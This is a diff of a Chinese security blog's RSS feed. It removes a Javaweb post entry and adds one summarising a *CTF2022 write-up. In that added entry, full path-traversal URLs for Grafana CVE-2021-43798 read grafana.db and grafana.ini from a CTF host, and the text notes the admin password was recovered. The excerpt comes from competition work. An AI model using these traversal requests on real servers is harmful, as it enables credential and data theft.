@@ -4,17 +4,9 @@
         <link>https://example.com/</link>
         <description>Huamang&#39;s Blog</description>
         <generator>Hugo -- gohugo.io</generator><language>zh-CN</language><managingEditor>3364744355@qq.com (Huamang)</managingEditor>
-            <webMaster>3364744355@qq.com (Huamang)</webMaster><copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright><lastBuildDate>Mon, 26 Sep 2022 02:23:25 &#43;0800</lastBuildDate>
+            <webMaster>3364744355@qq.com (Huamang)</webMaster><copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright><lastBuildDate>Mon, 19 Sep 2022 02:09:13 &#43;0800</lastBuildDate>
             <atom:link href="https://example.com/index.xml" rel="self" type="application/rss+xml" />
         <item>
-    <title>Javaweb_Review_1</title>
-    <link>https://example.com/javaweb_review_1/</link>
-    <pubDate>Mon, 26 Sep 2022 02:23:25 &#43;0800</pubDate>
-    <author>Huamang</author>
-    <guid>https://example.com/javaweb_review_1/</guid>
-    <description><![CDATA[Javaweb基础复习 JDBC基础操作 要点： 导入mysql的jar包，在顶栏中选择项目，模块，导入jar Class.forName(&quot;com.mysql.jdbc.Driver&quot;); 初始化给定的类，自动注册驱动 获取连]]></description>
-</item>
-<item>
     <title>SSTI_OF_FLASK</title>
     <link>https://example.com/ssti/</link>
     <pubDate>Mon, 19 Sep 2022 02:09:13 &#43;0800</pubDate>
@@ -85,6 +77,14 @@
     <author>Huamang</author>
     <guid>https://example.com/%E6%A0%A1%E8%B5%9B%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/</guid>
     <description><![CDATA[前言 （使用github图床，请科学上网） 搭建校赛平台，这里是发现有一个很好看的ctfd的主题pixo 所以就想着来搭建这么一个平台，这次我打算]]></description>
+</item>
+<item>
+    <title>[*CTF2022] WP</title>
+    <link>https://example.com/ctf2022_wp/</link>
+    <pubDate>Sun, 17 Apr 2022 18:29:06 &#43;0800</pubDate>
+    <author>Huamang</author>
+    <guid>https://example.com/ctf2022_wp/</guid>
+    <description><![CDATA[Web oh-my-grafana 存在CVE-2021-43798 paylaod 1 http://124.70.163.46:3000/public/plugins/alertGroups/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar/lib/grafana/grafana.db 有个加盐的密码 再找找其他配置文件，反正任意文件读取用起来 1 http://124.70.163.46:3000/public/plugins/alertGroups/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc/grafana/grafana.ini 拿到了密码 1 2 3 4 5 # default admin user, created on startup admin_user =]]></description>
 </item>
 </channel>
 </rss>
